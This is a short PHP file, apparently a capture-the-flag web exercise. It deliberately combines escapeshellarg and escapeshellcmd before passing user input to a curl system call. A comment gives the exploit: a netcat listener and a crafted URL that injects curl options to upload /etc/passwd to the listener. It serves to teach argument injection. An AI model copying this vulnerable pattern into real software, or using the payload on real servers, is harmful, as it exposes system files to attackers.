<!-- 參考 : https://github.com/wonderkun/CTF_web/tree/master/exec 
     nc -kl localhost 8887
     http://localhost:8888/?url=http://127.0.0.1/' -F file=@/etc/passwd -x 127.0.0.1:8887%20
-->

<?php
$url = $_GET['url'];
$url=escapeshellarg($url);
$url=escapeshellcmd($url);
system("curl ".$url);
?>


